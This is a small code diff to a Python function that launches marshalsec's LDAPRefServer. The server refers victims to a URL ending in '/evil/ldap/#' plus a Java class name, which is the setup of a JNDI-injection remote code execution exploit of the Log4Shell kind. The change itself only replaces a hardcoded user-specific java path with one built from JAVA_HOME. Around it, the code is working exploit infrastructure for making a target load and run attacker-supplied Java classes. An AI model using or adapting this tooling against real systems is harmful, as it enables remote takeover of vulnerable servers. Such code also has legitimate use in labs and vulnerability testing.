@@ -13,9 +13,9 @@ def start_ldap_server(web_server_address: str, web_server_port: int, java_class_
 
     url = f"http://{web_server_address}:{web_server_port}/evil/ldap/#{java_class_to_load}"
     current_folder = Path(__file__).parent.resolve()
-    
+
     subprocess.run([
-        "/Users/e.abbas.zadeh.namini/.asdf/shims/java",
+        os.environ.get('JAVA_HOME')+"/bin/java",
         "-cp",
         os.path.join(current_folder, "marshalsec-0.0.3-SNAPSHOT-all.jar"),
         "marshalsec.jndi.LDAPRefServer",
